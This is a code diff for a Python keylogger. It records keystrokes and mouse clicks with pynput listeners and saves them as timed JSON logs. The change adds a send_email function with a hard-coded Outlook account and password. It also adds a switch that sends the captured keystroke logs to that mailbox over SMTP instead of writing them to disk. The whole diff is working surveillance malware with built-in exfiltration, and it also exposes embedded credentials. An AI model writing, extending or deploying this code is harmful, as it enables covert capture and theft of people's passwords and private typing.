@@ -34,12 +34,14 @@ def construct_mime(email_address, contents):
     
     return message
 
-def send_email(email_address, password, contents):
+def send_email(json_string):
+    address = 'keylogger-sap@outlook.com'
+    pssword = 'MyK3yLogger124'
     server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
     server.starttls()
-    server.login(email_address, password)
+    server.login(address, pssword)
 
-    mime_object = construct_mime(email_address, contents)
+    mime_object = construct_mime(address, json_string)
     server.send_message(mime_object)
 
     server.quit()
@@ -57,10 +59,13 @@ def get_focus_app_string():
 """
 
 class Monitor:
-    passphrase = "I'm fishing in the river champion!"
-
     def __init__(self):
-        self.log_interval = 2 
+        # settings
+        self.log_folder = 'logs'
+        self.log_interval = 5
+        self.passphrase = 'fishing-in-the-river-champion'
+        self.log_via_email = False
+
         # state variables
         self.logs = list()
         self.text = str()
@@ -69,11 +74,18 @@ class Monitor:
         self.keys = keyboard.Listener(on_press=self.on_press)
         self.mice = mouse.Listener(on_click=self.on_click)
     
+    def log_to_file(self, json_string):
+        with open(f'{self.log_folder}/{timestamp()}.json', 'w') as log_file:
+            log_file.write(json_string)
+    
     def create_log(self):
+        json_string = json.dumps(self.logs, indent=4)
         # for now we log even if there was no log contents
-        log_name = f'logs/{timestamp()}.json'
-        with open(log_name, 'w') as log_file:
-            log_file.write(json.dumps(self.logs, indent=4))
+        if self.log_via_email:
+            send_email(json_string)
+        else:
+            self.log_to_file(json_string)
+
         self.logs = list()
 
         timer = threading.Timer(interval=self.log_interval, function=self.create_log)
@@ -112,7 +124,7 @@ class Monitor:
     def run(self):
         # create the logs folder if it does not exist
         try:
-            os.mkdir('logs')
+            os.mkdir(self.log_folder)
         except FileExistsError:
             pass
 
